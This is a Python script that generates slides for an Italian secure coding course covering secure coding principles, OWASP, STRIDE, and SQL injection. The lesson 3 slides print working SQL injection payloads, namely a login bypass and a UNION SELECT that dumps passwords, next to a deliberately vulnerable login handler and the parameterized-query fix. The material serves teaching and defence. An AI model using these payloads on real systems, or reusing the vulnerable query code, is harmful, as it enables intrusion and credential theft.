"""Genera 8 file PPTX con grafica curata per il corso 16h Secure Coding.

Stile:
  - Palette: blu scuro #0F2D52 + accent teal #00A0B0
  - Anti-pattern in rosso (#E63946), best practice in verde (#06A77D)
  - Layout uniforme: cover, sezione, contenuto, codice, due-colonne, Q&A
  - Footer con numerazione slide e brand corso

Uso:
    pip install python-pptx
    python generate_slides.py
"""

from pptx import Presentation
from pptx.util import Inches, Pt, Emu
from pptx.dml.color import RGBColor
from pptx.enum.shapes import MSO_SHAPE
from pptx.enum.text import PP_ALIGN, MSO_ANCHOR

# === PALETTE COLORI ===
COL_PRIMARY = RGBColor(0x0F, 0x2D, 0x52)      # blu scuro
COL_ACCENT = RGBColor(0x00, 0xA0, 0xB0)        # teal
COL_BG_LIGHT = RGBColor(0xF1, 0xF4, 0xF8)      # grigio chiarissimo
COL_TEXT = RGBColor(0x1A, 0x1A, 0x2E)          # testo scuro
COL_TEXT_LIGHT = RGBColor(0xFF, 0xFF, 0xFF)    # testo bianco
COL_DANGER = RGBColor(0xE6, 0x39, 0x46)        # rosso anti-pattern
COL_OK = RGBColor(0x06, 0xA7, 0x7D)            # verde best practice
COL_WARN = RGBColor(0xF7, 0x93, 0x1E)          # arancio warning
COL_GREY = RGBColor(0x6B, 0x72, 0x80)          # grigio testo

# === FONT ===
FONT_TITLE = "Calibri"
FONT_BODY = "Calibri"
FONT_CODE = "Consolas"

# === LAYOUT (16:9) ===
SLIDE_W = Inches(13.333)
SLIDE_H = Inches(7.5)


def new_pres() -> Presentation:
    """Crea presentation 16:9 con layout vuoto."""
    p = Presentation()
    p.slide_width = SLIDE_W
    p.slide_height = SLIDE_H
    return p


def add_blank(prs: Presentation):
    """Aggiunge una slide vuota."""
    return prs.slides.add_slide(prs.slide_layouts[6])  # Blank layout


def rect(slide, x, y, w, h, fill_color, line_color=None):
    """Rettangolo colorato."""
    shape = slide.shapes.add_shape(MSO_SHAPE.RECTANGLE, x, y, w, h)
    shape.fill.solid()
    shape.fill.fore_color.rgb = fill_color
    if line_color is None:
        shape.line.fill.background()
    else:
        shape.line.color.rgb = line_color
    return shape


def textbox(slide, x, y, w, h, text, size=18, color=None, bold=False,
            italic=False, font=FONT_BODY, align=PP_ALIGN.LEFT,
            anchor=MSO_ANCHOR.TOP):
    """Casella di testo formattata."""
    tb = slide.shapes.add_textbox(x, y, w, h)
    tf = tb.text_frame
    tf.word_wrap = True
    tf.margin_left = Inches(0.05)
    tf.margin_right = Inches(0.05)
    tf.margin_top = Inches(0.02)
    tf.margin_bottom = Inches(0.02)
    tf.vertical_anchor = anchor

    # Process multi-paragraph text
    lines = text.split("\n") if isinstance(text, str) else [text]
    for i, line in enumerate(lines):
        if i == 0:
            p = tf.paragraphs[0]
        else:
            p = tf.add_paragraph()
        p.alignment = align
        run = p.add_run()
        run.text = line
        run.font.name = font
        run.font.size = Pt(size)
        run.font.bold = bold
        run.font.italic = italic
        if color is not None:
            run.font.color.rgb = color
    return tb


def bullets(slide, x, y, w, h, items, size=18, color=None,
            line_spacing=1.4):
    """Lista a punti con bullet ▸ verde."""
    tb = slide.shapes.add_textbox(x, y, w, h)
    tf = tb.text_frame
    tf.word_wrap = True
    tf.margin_left = Inches(0.1)
    tf.margin_right = Inches(0.1)

    for i, item in enumerate(items):
        if i == 0:
            p = tf.paragraphs[0]
        else:
            p = tf.add_paragraph()
        p.line_spacing = line_spacing
        # Bullet decorativo
        run0 = p.add_run()
        run0.text = "▸  "
        run0.font.name = FONT_BODY
        run0.font.size = Pt(size)
        run0.font.bold = True
        run0.font.color.rgb = COL_ACCENT

        # Testo
        run = p.add_run()
        run.text = item
        run.font.name = FONT_BODY
        run.font.size = Pt(size)
        if color is not None:
            run.font.color.rgb = color
        else:
            run.font.color.rgb = COL_TEXT
    return tb


def footer(slide, lesson_label: str, slide_num: int, total: int):
    """Footer fisso in basso con linea + label + numero slide."""
    # Linea separatrice
    line = slide.shapes.add_connector(1, Inches(0.5), Inches(7.05),
                                       Inches(12.83), Inches(7.05))
    line.line.color.rgb = COL_ACCENT
    line.line.width = Pt(1.5)

    # Brand a sinistra
    textbox(slide, Inches(0.5), Inches(7.08), Inches(8), Inches(0.35),
            "Secure Coding · Corso IFTS STEM · A. Manneschi",
            size=10, color=COL_GREY)

    # Numero a destra
    textbox(slide, Inches(11.5), Inches(7.08), Inches(1.3), Inches(0.35),
            f"{lesson_label}  ·  {slide_num}/{total}",
            size=10, color=COL_GREY, align=PP_ALIGN.RIGHT, bold=True)


# ============================================================================
# TIPI DI SLIDE
# ============================================================================

def slide_cover(prs, lesson_num: str, title: str, subtitle: str, hours: str):
    """Slide copertina lezione."""
    s = add_blank(prs)

    # Sfondo blu pieno
    rect(s, 0, 0, SLIDE_W, SLIDE_H, COL_PRIMARY)

    # Banda accento in alto a sinistra
    rect(s, 0, Inches(1.0), Inches(0.4), Inches(2.5), COL_ACCENT)

    # Lesson label
    textbox(s, Inches(0.8), Inches(1.0), Inches(11), Inches(0.6),
            f"LEZIONE {lesson_num}", size=18, color=COL_ACCENT, bold=True,
            font=FONT_TITLE)

    # Titolo grande
    textbox(s, Inches(0.8), Inches(1.7), Inches(11), Inches(2.0),
            title, size=54, color=COL_TEXT_LIGHT, bold=True, font=FONT_TITLE)

    # Sottotitolo
    textbox(s, Inches(0.8), Inches(3.9), Inches(11), Inches(1.2),
            subtitle, size=24, color=COL_TEXT_LIGHT, italic=True,
            font=FONT_TITLE)

    # Durata
    textbox(s, Inches(0.8), Inches(5.5), Inches(11), Inches(0.5),
            f"⏱  {hours}", size=18, color=COL_ACCENT, bold=True)

    # Brand in basso
    textbox(s, Inches(0.8), Inches(6.5), Inches(11), Inches(0.5),
            "Corso IFTS STEM · Specialista nelle Tecniche di Evoluzione e Manutenzione del Software",
            size=12, color=COL_TEXT_LIGHT)
    textbox(s, Inches(0.8), Inches(6.85), Inches(11), Inches(0.4),
            "Ing. Alessandro Manneschi · Anno formativo 2024/2025",
            size=11, color=COL_TEXT_LIGHT, italic=True)


def slide_section(prs, lesson_label: str, sec_num: str, sec_title: str,
                   intro: str, slide_num: int, total: int):
    """Slide di apertura di una sezione (sottosezione del capitolo)."""
    s = add_blank(prs)

    # Banda colorata a sinistra
    rect(s, 0, 0, Inches(2.5), SLIDE_H, COL_PRIMARY)

    # Numero sezione grande sulla banda
    textbox(s, Inches(0.3), Inches(2.5), Inches(2.0), Inches(2.0),
            sec_num, size=120, color=COL_ACCENT, bold=True,
            font=FONT_TITLE, align=PP_ALIGN.CENTER)

    # Titolo a destra
    textbox(s, Inches(3.0), Inches(2.8), Inches(9.8), Inches(1.5),
            sec_title, size=42, color=COL_PRIMARY, bold=True,
            font=FONT_TITLE)

    # Intro
    if intro:
        textbox(s, Inches(3.0), Inches(4.3), Inches(9.8), Inches(2.0),
                intro, size=18, color=COL_GREY, italic=True)

    footer(s, lesson_label, slide_num, total)


def slide_content(prs, lesson_label: str, title: str, items: list,
                   slide_num: int, total: int, subtitle: str = None,
                   bullet_size: int = 20):
    """Slide standard con titolo + bullet list."""
    s = add_blank(prs)

    # Header bar
    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title, size=24, color=COL_TEXT_LIGHT, bold=True, font=FONT_TITLE,
            anchor=MSO_ANCHOR.MIDDLE)

    # Sottotitolo (opzionale)
    y_start = Inches(1.1)
    if subtitle:
        textbox(s, Inches(0.5), Inches(1.0), Inches(12.3), Inches(0.5),
                subtitle, size=16, color=COL_ACCENT, italic=True)
        y_start = Inches(1.6)

    # Bullets
    bullets(s, Inches(0.7), y_start, Inches(12), Inches(5.5),
            items, size=bullet_size, line_spacing=1.5)

    footer(s, lesson_label, slide_num, total)


def slide_quote(prs, lesson_label: str, quote: str, attr: str,
                slide_num: int, total: int):
    """Slide con quote prominente."""
    s = add_blank(prs)

    # Sfondo chiaro
    rect(s, 0, 0, SLIDE_W, SLIDE_H, COL_BG_LIGHT)

    # Grandi virgolette decorative
    textbox(s, Inches(0.5), Inches(0.8), Inches(2), Inches(2),
            "“", size=200, color=COL_ACCENT, bold=True,
            font="Georgia")

    # Quote
    textbox(s, Inches(2.5), Inches(2.0), Inches(10), Inches(3.5),
            quote, size=32, color=COL_PRIMARY, bold=True, italic=True,
            font=FONT_TITLE, anchor=MSO_ANCHOR.MIDDLE)

    # Attribution
    if attr:
        textbox(s, Inches(2.5), Inches(5.5), Inches(10), Inches(0.5),
                f"— {attr}", size=16, color=COL_GREY, italic=True)

    footer(s, lesson_label, slide_num, total)


def slide_code(prs, lesson_label: str, title: str, code: str,
                slide_num: int, total: int, lang_label: str = "python",
                bad: bool = False, note: str = None):
    """Slide con blocco di codice (good o bad)."""
    s = add_blank(prs)

    # Header bar
    bar_color = COL_DANGER if bad else COL_OK
    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(11), Inches(0.55),
            title, size=24, color=COL_TEXT_LIGHT, bold=True, font=FONT_TITLE,
            anchor=MSO_ANCHOR.MIDDLE)

    # Lang label / status badge in alto a destra
    badge_text = "🚩 ANTI-PATTERN" if bad else f"✅ {lang_label.upper()}"
    rect(s, Inches(10.8), Inches(0.18), Inches(2.3), Inches(0.5), bar_color)
    textbox(s, Inches(10.8), Inches(0.20), Inches(2.3), Inches(0.5),
            badge_text, size=12, color=COL_TEXT_LIGHT, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

    # Code block container
    code_y = Inches(1.2)
    code_h = Inches(5.0)
    rect(s, Inches(0.5), code_y, Inches(12.3), code_h, COL_BG_LIGHT,
         line_color=bar_color)

    # Codice
    tb = textbox(s, Inches(0.7), code_y + Inches(0.2),
                  Inches(12), code_h - Inches(0.4),
                  code, size=14, font=FONT_CODE, color=COL_TEXT)

    # Note
    if note:
        note_color = COL_DANGER if bad else COL_OK
        textbox(s, Inches(0.5), Inches(6.4), Inches(12.3), Inches(0.5),
                f"{'⚠' if bad else '✓'}  {note}",
                size=14, color=note_color, italic=True, bold=True)

    footer(s, lesson_label, slide_num, total)


def slide_two_col(prs, lesson_label: str, title: str,
                   left_title: str, left_items: list,
                   right_title: str, right_items: list,
                   slide_num: int, total: int,
                   left_color=None, right_color=None):
    """Slide a due colonne (es. Bad vs Good)."""
    s = add_blank(prs)

    if left_color is None:
        left_color = COL_DANGER
    if right_color is None:
        right_color = COL_OK

    # Header
    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title, size=24, color=COL_TEXT_LIGHT, bold=True, font=FONT_TITLE,
            anchor=MSO_ANCHOR.MIDDLE)

    # Colonna sinistra
    col_w = Inches(6.0)
    col_h = Inches(5.4)
    rect(s, Inches(0.5), Inches(1.2), col_w, Inches(0.7), left_color)
    textbox(s, Inches(0.5), Inches(1.2), col_w, Inches(0.7),
            left_title, size=18, color=COL_TEXT_LIGHT, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)
    rect(s, Inches(0.5), Inches(1.9), col_w, col_h, COL_BG_LIGHT,
         line_color=left_color)
    bullets(s, Inches(0.7), Inches(2.05), col_w - Inches(0.4), col_h,
            left_items, size=15, line_spacing=1.4)

    # Colonna destra
    rect(s, Inches(6.8), Inches(1.2), col_w, Inches(0.7), right_color)
    textbox(s, Inches(6.8), Inches(1.2), col_w, Inches(0.7),
            right_title, size=18, color=COL_TEXT_LIGHT, bold=True,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)
    rect(s, Inches(6.8), Inches(1.9), col_w, col_h, COL_BG_LIGHT,
         line_color=right_color)
    bullets(s, Inches(7.0), Inches(2.05), col_w - Inches(0.4), col_h,
            right_items, size=15, line_spacing=1.4)

    footer(s, lesson_label, slide_num, total)


def slide_table(prs, lesson_label: str, title: str, headers: list,
                 rows: list, slide_num: int, total: int):
    """Slide con tabella."""
    s = add_blank(prs)

    # Header
    rect(s, 0, 0, SLIDE_W, Inches(0.85), COL_PRIMARY)
    textbox(s, Inches(0.5), Inches(0.18), Inches(12), Inches(0.55),
            title, size=24, color=COL_TEXT_LIGHT, bold=True, font=FONT_TITLE,
            anchor=MSO_ANCHOR.MIDDLE)

    # Tabella
    nrows = len(rows) + 1
    ncols = len(headers)
    tbl_x = Inches(0.5)
    tbl_y = Inches(1.3)
    tbl_w = Inches(12.3)
    tbl_h = Inches(5.5)

    table_shape = s.shapes.add_table(nrows, ncols, tbl_x, tbl_y, tbl_w, tbl_h)
    table = table_shape.table

    # Header row
    for j, h in enumerate(headers):
        cell = table.cell(0, j)
        cell.fill.solid()
        cell.fill.fore_color.rgb = COL_PRIMARY
        cell.text_frame.clear()
        p = cell.text_frame.paragraphs[0]
        p.alignment = PP_ALIGN.CENTER
        run = p.add_run()
        run.text = h
        run.font.name = FONT_TITLE
        run.font.size = Pt(14)
        run.font.bold = True
        run.font.color.rgb = COL_TEXT_LIGHT

    # Data rows
    for i, row in enumerate(rows, start=1):
        for j, val in enumerate(row):
            cell = table.cell(i, j)
            cell.fill.solid()
            cell.fill.fore_color.rgb = (COL_BG_LIGHT if i % 2 == 1
                                          else RGBColor(0xFF, 0xFF, 0xFF))
            cell.text_frame.clear()
            p = cell.text_frame.paragraphs[0]
            p.alignment = PP_ALIGN.LEFT
            run = p.add_run()
            run.text = str(val)
            run.font.name = FONT_BODY
            run.font.size = Pt(12)
            run.font.color.rgb = COL_TEXT

    footer(s, lesson_label, slide_num, total)


def slide_qa(prs, lesson_label: str, slide_num: int, total: int,
              next_lesson: str = None):
    """Slide finale Q&A."""
    s = add_blank(prs)

    # Sfondo blu
    rect(s, 0, 0, SLIDE_W, SLIDE_H, COL_PRIMARY)

    # Cerchio decorativo
    circle = s.shapes.add_shape(MSO_SHAPE.OVAL, Inches(9.5), Inches(0.5),
                                  Inches(3.5), Inches(3.5))
    circle.fill.solid()
    circle.fill.fore_color.rgb = COL_ACCENT
    circle.line.fill.background()

    # Q&A grande
    textbox(s, Inches(0.8), Inches(1.8), Inches(8), Inches(2.5),
            "Domande?", size=88, color=COL_TEXT_LIGHT, bold=True,
            font=FONT_TITLE)

    # ?
    textbox(s, Inches(9.5), Inches(0.5), Inches(3.5), Inches(3.5),
            "?", size=180, color=COL_TEXT_LIGHT, bold=True, font=FONT_TITLE,
            align=PP_ALIGN.CENTER, anchor=MSO_ANCHOR.MIDDLE)

    # Riepilogo cosa portarsi via
    textbox(s, Inches(0.8), Inches(4.5), Inches(11), Inches(0.5),
            "Cosa portarti via:", size=22, color=COL_ACCENT, bold=True)

    if next_lesson:
        textbox(s, Inches(0.8), Inches(5.8), Inches(11), Inches(0.6),
                f"➜  Prossima lezione: {next_lesson}",
                size=18, color=COL_TEXT_LIGHT, italic=True)

    footer(s, lesson_label, slide_num, total)


# ============================================================================
# CONTENUTI DELLE 8 LEZIONI
# ============================================================================

def make_lesson_1():
    """L1 — Perché il secure coding."""
    prs = new_pres()
    total = 12
    LL = "L1"

    # 1. Cover
    slide_cover(prs, "1",
                 "Perché il secure coding",
                 "Fondamenti, CIA, 5 principi, mentalità avversaria",
                 "Lezione 1 · 2 ore")

    # 2. Obiettivi
    slide_content(prs, LL, "Obiettivi della lezione",
                   [
                       "Definire la sicurezza in termini misurabili (CIA Triad)",
                       "Distinguere sicurezza del codice da sicurezza informatica",
                       "Conoscere i 5 principi fondamentali del Secure Coding",
                       "Analizzare 3 casi reali di breach",
                       "Adottare la 'mentalità avversaria' nel proprio codice",
                   ], 2, total)

    # 3. Caso reale Equifax
    slide_section(prs, LL, "01", "Una storia: Equifax 2017",
                   "147 milioni di record rubati, 1,4 miliardi di costo. Causa? Una patch non installata.",
                   3, total)

    # 4. Equifax dettagli
    slide_content(prs, LL, "Cosa è andato storto",
                   [
                       "Marzo 2017: pubblicata patch per Apache Struts (CVE-2017-5638, CVSS 10.0)",
                       "Equifax la conosce. Equifax NON la installa per 2 mesi",
                       "Maggio-luglio 2017: attaccanti sfruttano la vulnerabilità",
                       "147M di record clienti rubati (nome, SSN, indirizzo, data di nascita)",
                       "Costo finale: ~$1,4 miliardi · CEO/CSO/CIO licenziati",
                   ], 4, total, "La sicurezza non è il giorno del breach: è il processo dei mesi prima")

    # 5. CIA Triad
    slide_content(prs, LL, "Cosa significa 'essere sicuri': la CIA Triad",
                   [
                       "C — Confidentiality (Riservatezza): dati visibili solo a chi può vederli",
                       "I — Integrity (Integrità): dati non modificati senza autorizzazione",
                       "A — Availability (Disponibilità): sistema funziona quando serve",
                       "",
                       "Ogni breach viola almeno una di queste 3 proprietà",
                   ], 5, total)

    # 6. Quote
    slide_quote(prs, LL,
                 "La sicurezza non è una feature: è una proprietà del sistema.",
                 "Bruce Schneier",
                 6, total)

    # 7. Sicurezza del codice vs informatica
    slide_two_col(prs, LL, "Due tipi di sicurezza diversi",
                   "Sicurezza informatica",
                   ["Rete, server, OS",
                    "Firewall, VPN, accessi SSH",
                    "Sistemisti / IT",
                    "Esempio: configurare il firewall"],
                   "Sicurezza del codice",
                   ["Applicazioni, API, dati",
                    "Validation, query parametrizzate, escape",
                    "Sviluppatori (TU)",
                    "Esempio: prevenire SQL Injection"],
                   7, total,
                   left_color=COL_GREY, right_color=COL_ACCENT)

    # 8. I 5 principi
    slide_content(prs, LL, "I 5 principi del Secure Coding",
                   [
                       "1. Least Privilege — minimo privilegio necessario",
                       "2. Defense in Depth — più strati indipendenti",
                       "3. Fail Secure — se si rompe, chiudi (default deny)",
                       "4. KISS — meno codice, meno bug, meno superficie",
                       "5. Separation of Duties — mai una persona/processo da solo",
                   ], 8, total)

    # 9. Esempio Fail Secure
    slide_code(prs, LL, "Esempio: Fail Secure vs Fail Open",
                """try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception:
    return resource   # 💥 fail OPEN
                  # se il check si rompe, l'utente entra lo stesso""",
                9, total, lang_label="python", bad=True,
                note="Codice 'robusto' all'apparenza, in realtà un disastro")

    # 10. Fail Secure corretto
    slide_code(prs, LL, "Fail Secure: la versione corretta",
                """try:
    if not is_authorized(user, resource):
        return 403
    return resource
except Exception as e:
    log.exception("auth check failed")
    return 503   # ✅ servizio non disponibile,
                 # NON accesso senza autorizzazione""",
                10, total, lang_label="python", bad=False,
                note="In dubbio, il sistema CHIUDE, non APRE")

    # 11. Mentalità avversaria
    slide_content(prs, LL, "Mentalità avversaria",
                   [
                       "Sviluppatore: 'fa quello che deve fare?'",
                       "Attaccante: 'cosa fa che NON dovrebbe fare?'",
                       "",
                       "Esempio: un login funzionante può essere vulnerabile a 7 attacchi",
                       "  SQL Injection · brute force · timing · privilege escalation · ...",
                       "",
                       "La sicurezza è 'l'altra metà' della professionalità",
                   ], 11, total)

    # 12. Q&A
    slide_qa(prs, LL, 12, total,
             next_lesson="L2 — OWASP, threat modeling, STRIDE")

    prs.save("L1_perche_secure_coding.pptx")
    print("OK L1")


def make_lesson_2():
    """L2 — OWASP, threat modeling, STRIDE."""
    prs = new_pres()
    total = 14
    LL = "L2"

    slide_cover(prs, "2",
                 "OWASP, threat modeling e STRIDE",
                 "Come pensare alla sicurezza prima di scrivere codice",
                 "Lezione 2 · 2 ore")

    slide_content(prs, LL, "Obiettivi",
                   [
                       "Conoscere OWASP e la Top 10 delle vulnerabilità web",
                       "Saper leggere CVE e CVSS",
                       "Applicare un threat modeling leggero (4 domande)",
                       "Usare STRIDE come checklist sistematica",
                       "Disegnare un Data Flow Diagram con trust boundary",
                   ], 2, total)

    slide_quote(prs, LL,
                 "Bug a design: 1x. In coding: 5x. In testing: 10x. In produzione: 100x.",
                 "IBM Cost of a Data Breach Report",
                 3, total)

    slide_content(prs, LL, "OWASP — cosa è",
                   [
                       "Open Web Application Security Project",
                       "Fondazione no-profit, internazionale, dal 2001",
                       "Tutto gratuito, niente vendita",
                       "Standard de facto della sicurezza applicativa",
                       "",
                       "Produce: Top 10, Cheat Sheets, ASVS, ZAP, ...",
                   ], 4, total)

    slide_table(prs, LL, "OWASP Top 10 (2021/2025)",
                 ["#", "Vulnerabilità", "Esempio"],
                 [
                     ["A01", "Broken Access Control", "Cambi ?id=42 in ?id=43, vedi dati altrui"],
                     ["A02", "Cryptographic Failures", "Password in MD5, HTTPS mancante"],
                     ["A03", "Injection", "SQL Injection, XSS"],
                     ["A04", "Insecure Design", "Manca threat modeling"],
                     ["A05", "Security Misconfiguration", "Default credentials, debug=True in prod"],
                     ["A06", "Vulnerable Components", "Libreria con CVE nota (es. Log4Shell)"],
                     ["A07", "Auth Failures", "Login senza rate limit, no MFA"],
                     ["A08", "Software & Data Integrity", "Aggiornamenti non verificati"],
                     ["A09", "Logging Failures", "Non rilevi il breach per 200 giorni"],
                     ["A10", "SSRF", "App fetcha URL fornito dall'utente"],
                 ], 5, total)

    slide_content(prs, LL, "CVE — Common Vulnerabilities and Exposures",
                   [
                       "Identificatore univoco di una vulnerabilità nota",
                       "Formato: CVE-AAAA-NNNNN (anno + progressivo)",
                       "Database principale: NVD — nvd.nist.gov",
                       "",
                       "Esempi famosi:",
                       "  CVE-2014-0160 → Heartbleed",
                       "  CVE-2021-44228 → Log4Shell",
                       "  CVE-2024-3094 → XZ Utils backdoor",
                   ], 6, total)

    slide_content(prs, LL, "CVSS — punteggio di gravità (0-10)",
                   [
                       "0.0 — None",
                       "0.1-3.9 — Low",
                       "4.0-6.9 — Medium",
                       "7.0-8.9 — High → patcha entro 30 giorni",
                       "9.0-10.0 — CRITICAL → patcha SUBITO",
                       "",
                       "Log4Shell era 10.0",
                   ], 7, total)

    slide_section(prs, LL, "02", "Threat Modeling",
                   "30 minuti di carta + lavagna salvano ore di refactor", 8, total)

    slide_content(prs, LL, "Le 4 domande di Adam Shostack",
                   [
                       "1. Cosa stiamo costruendo? → disegna il sistema (DFD)",
                       "2. Cosa può andare storto? → applica STRIDE",
                       "3. Cosa facciamo a riguardo? → mitiga / accetta / elimina",
                       "4. Abbiamo fatto un buon lavoro? → review e iterazione",
                       "",
                       "Si fa PRIMA di scrivere codice. Su carta, in 30-60 minuti.",
                   ], 9, total)

    slide_content(prs, LL, "STRIDE — sei lettere, sei categorie",
                   [
                       "S — Spoofing: fingersi qualcun altro (viola Authenticity)",
                       "T — Tampering: modificare dati (viola Integrity)",
                       "R — Repudiation: negare di aver fatto (viola Non-repudiation)",
                       "I — Information Disclosure: esporre dati (viola Confidentiality)",
                       "D — Denial of Service: rendere indisponibile (viola Availability)",
                       "E — Elevation of Privilege: ottenere più privilegi del previsto",
                   ], 10, total)

    slide_content(prs, LL, "Data Flow Diagram — 4 simboli",
                   [
                       "□  Rettangolo: entità esterna (utente, sistema terzo)",
                       "○  Cerchio: processo (codice in esecuzione)",
                       "═══ Linee parallele: datastore (DB, file)",
                       "→  Freccia: flusso di dati",
                       "┄┄  Linea tratteggiata: trust boundary",
                       "",
                       "Ogni attraversamento di trust boundary = opportunità di attacco",
                   ], 11, total)

    slide_table(prs, LL, "STRIDE light — esempio su mini-blog",
                 ["Elemento", "STRIDE", "Minaccia", "Difesa"],
                 [
                     ["Utente", "S", "Account takeover", "Password robuste + MFA"],
                     ["Webapp", "T", "Modifica cookie", "Cookie firmato server-side"],
                     ["Webapp", "I", "Stack trace su 500", "Error handler generico"],
                     ["Webapp", "D", "Brute force login", "Rate limit 5/min"],
                     ["Webapp", "E", "SQLi → admin", "Query parametrizzate"],
                     ["DB", "I", "Backup esposto", "Cifratura backup"],
                     ["Flusso utente→web", "I", "Sniffing Wi-Fi", "HTTPS"],
                 ], 12, total)

    slide_content(prs, LL, "Workshop in aula (15 min)",
                   [
                       "A coppie: applica STRIDE a un e-commerce piccolo",
                       "  registrazione · login · ricerca · ordine · pagamento Stripe · email",
                       "",
                       "Output richiesto:",
                       "  Disegno DFD (≥4 processi, 2 datastore, 2 trust boundary)",
                       "  Tabella STRIDE con ≥8 minacce sparse tra le 6 categorie",
                       "  Una mitigazione per ogni minaccia",
                   ], 13, total)

    slide_qa(prs, LL, 14, total,
             next_lesson="L3 — SQL Injection (il cuore tecnico)")

    prs.save("L2_owasp_stride.pptx")
    print("OK L2")


def make_lesson_3():
    """L3 — SQL Injection."""
    prs = new_pres()
    total = 14
    LL = "L3"

    slide_cover(prs, "3",
                 "SQL Injection",
                 "La vulnerabilità #1 dal 2003. Capirla e correggerla.",
                 "Lezione 3 · 2 ore")

    slide_content(prs, LL, "Obiettivi",
                   [
                       "Riconoscere a vista una SQL Injection nel codice",
                       "Eseguire login bypass con ' OR '1'='1' --",
                       "Estrarre dati arbitrari con UNION SELECT",
                       "Capire perché filtrare gli apici NON funziona",
                       "Correggere con query parametrizzate (Python, Java, PHP, JS)",
                   ], 2, total)

    slide_quote(prs, LL,
                 "Il database deve distinguere tra DATI e ISTRUZIONI. Se non lo fa, sei nei guai.",
                 None, 3, total)

    slide_content(prs, LL, "Analogia: il modulo cartaceo",
                   [
                       "Immagina di lavorare all'anagrafe. Un cittadino scrive nel campo Nome:",
                       "",
                       "  Mario --- distruggi tutti i moduli precedenti ---",
                       "",
                       "Cosa fai? Ovviamente ignori la 'parte in basso': è un campo, sai dove",
                       "finiscono i dati che ti interessano. NON confondi DATI con ISTRUZIONI.",
                       "",
                       "I database meno fortunati, invece, le confondono.",
                   ], 4, total)

    slide_code(prs, LL, "Il codice vulnerabile",
                """@app.route("/login", methods=["POST"])
def login():
    email = request.form["email"]
    pwd = request.form["password"]
    sql = f"SELECT id FROM users WHERE email = '{email}' AND password = '{pwd}'"
    row = db.execute(sql).fetchone()
    if row:
        session["user_id"] = row["id"]
        return redirect("/dashboard")
    return "Login fallito", 401""",
                5, total, lang_label="python", bad=True,
                note="f-string che mescola struttura SQL e dati utente = SQLi garantita")

    slide_section(prs, LL, "01", "Attacco 1: Login Bypass",
                   "Entrare senza conoscere la password — in 5 secondi", 6, total)

    slide_code(prs, LL, "Login bypass con ' OR '1'='1' --",
                """Email:    ' OR '1'='1' --
Password: qualunque

Query risultante:
SELECT id FROM users WHERE email = '' OR '1'='1' --' AND password = 'qualunque'

In SQL, -- commenta il resto. Quindi diventa:
SELECT id FROM users WHERE email = '' OR '1'='1'

'1'='1' è sempre vero → restituisce TUTTI gli utenti
L'app prende il primo → LOGIN RIUSCITO senza conoscere alcuna password""",
                7, total, lang_label="sql", bad=True,
                note="Variante: admin@bank.it' --  → entri direttamente come admin")

    slide_section(prs, LL, "02", "Attacco 2: UNION SELECT",
                   "Leggere password di tutti gli utenti da un endpoint di ricerca",
                   8, total)

    slide_code(prs, LL, "UNION SELECT — estrazione dati",
                """Cerca:  xyz' UNION SELECT email || ':' || password FROM users --

Query risultante:
SELECT contenuto FROM messaggi WHERE contenuto LIKE
    '%xyz' UNION SELECT email || ':' || password FROM users --%'

L'app mostra "messaggi"... ma in realtà mostra:
  alice@bank.it:alice_pass
  bob@bank.it:bob_pass
  admin@bank.it:Sup3rS3gr3t0!

In una sola richiesta, l'attaccante ha rubato TUTTE le password.""",
                9, total, lang_label="sql", bad=True,
                note="Combinato col bypass: takeover di TUTTI gli account in 30 secondi")

    slide_two_col(prs, LL, "Filtrare gli apici NON funziona",
                   "Tentativo ingenuo",
                   ["s = s.replace(\"'\", \"\")",
                    "Sembra di essere protetti...",
                    "...ma:",
                    "%27 (URL encoded)",
                    "\\' (escape)",
                    "Doppi apici",
                    "Unicode lookalike (ʼ)",
                    "Injection numerica (1 OR 1=1)"],
                   "Soluzione corretta",
                   ["Query parametrizzate",
                    "Separi STRUTTURA da DATI",
                    "Il driver tratta i dati come VALORI",
                    "Anche con qualunque input,",
                    "non viene mai interpretato come SQL",
                    "",
                    "Whitelist > Blacklist",
                    "(sempre)"],
                   10, total)

    slide_code(prs, LL, "La correzione: query parametrizzate (Python)",
                """sql = "SELECT id FROM users WHERE email = ? AND password = ?"
row = db.execute(sql, (email, pwd)).fetchone()

# I ? sono PLACEHOLDER
# I dati sono passati SEPARATAMENTE come tupla
# Il driver si occupa di trattarli come VALORI, non come SQL

# Anche se l'utente scrive: ' OR '1'='1' --
# il driver cerca LETTERALMENTE quella stringa
# → non la trova → login fallito ✓""",
                11, total, lang_label="python", bad=False,
                note="Una riga, una virgola, una tupla. SQLi impossibile per design")

    slide_table(prs, LL, "Cross-linguaggio: la stessa idea",
                 ["Linguaggio", "Pattern parametrizzato"],
                 [
                     ["Python (sqlite3/psycopg2)", "cursor.execute(\"... = ?\", (val,))"],
                     ["Java (JDBC)", "PreparedStatement ps = conn.prepareStatement(\"... = ?\")"],
                     ["PHP (PDO)", "$stmt = $pdo->prepare(\"... = ?\")"],
                     ["JavaScript (better-sqlite3)", "db.prepare(\"... = ?\").get(val)"],
                     ["ORM (SQLAlchemy, Hibernate, ...)", "User.query.filter_by(email=email).first()"],
                 ], 12, total)

    slide_content(prs, LL, "Difese in profondità",
                   [
                       "1. Query parametrizzate (difesa primaria, NON sostituibile)",
                       "2. ORM (forza il pattern corretto)",
                       "3. Least privilege per l'utente DB (no DROP/CREATE/GRANT)",
                       "4. Errori generici al client, dettagli nei log interni",
                       "5. WAF (Web Application Firewall) come strato aggiuntivo",
                       "6. Rate limiting sul login (anti brute force)",
                       "7. Audit log dei tentativi sospetti",
                   ], 13, total)

    slide_qa(prs, LL, 14, total,
             next_lesson="L4 — IDOR + password hashing (bcrypt)")

    prs.save("L3_sql_injection.pptx")
    print("OK L3")


def make_lesson_4():
    """L4 — IDOR + Password hashing."""
    prs = new_pres()
    total = 14
    LL = "L4"

    slide_cover(prs, "4",
                 "Autorizzazione e password",
                 "IDOR, status code, bcrypt — gli errori più costosi",
                 "Lezione 4 · 2 ore")

